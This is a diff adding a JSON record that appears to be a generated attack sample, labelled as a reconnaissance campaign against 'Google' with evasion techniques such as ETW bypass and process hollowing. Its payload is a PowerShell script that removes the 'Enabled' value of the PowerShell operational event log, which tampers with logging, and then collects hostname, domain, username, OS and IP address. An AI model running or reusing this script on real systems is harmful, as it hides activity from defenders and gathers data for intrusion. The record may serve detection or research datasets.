@@ -1,0 +1,13 @@
+{
+  "organization": "Google",
+  "campaign_type": "reconnaissance",
+  "evasion_techniques": [
+    "etw_bypass",
+    "polymorphic_code",
+    "memory_only",
+    "process_hollowing"
+  ],
+  "payload": "# V3z59oDabpYgFiy7Amh8\n# Generated: 2025-11-03T12:20:52.708814\n# System: 3BfYM0QSNfN3Ai2\n# Process: VoNnyIZwgutt\n\n\n# ETW Bypass via Registry\nRemove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winevt\\Channels\\Microsoft-Windows-PowerShell/Operational\" -Name \"Enabled\" -ErrorAction SilentlyContinue\n\n\n\n# System reconnaissance\n$systemInfo = @{\n    Hostname = $env:COMPUTERNAME\n    Domain = $env:USERDOMAIN\n    Username = $env:USERNAME\n    OS = (Get-WmiObject Win32_OperatingSystem).Caption\n    Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture\n    IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -eq \"Ethernet\" -or $_.InterfaceAlias -eq \"Wi-Fi\"}).IPAddress\n}\n\n$systemInfo | ConvertTo-Json\n",
+  "generated_at": "2025-11-03T12:20:52.708833",
+  "signature": "0b5dac0d9b7e1705ba0d36b5ba77f3629d4e3dc8145264253afb204b63fa0265"
+}
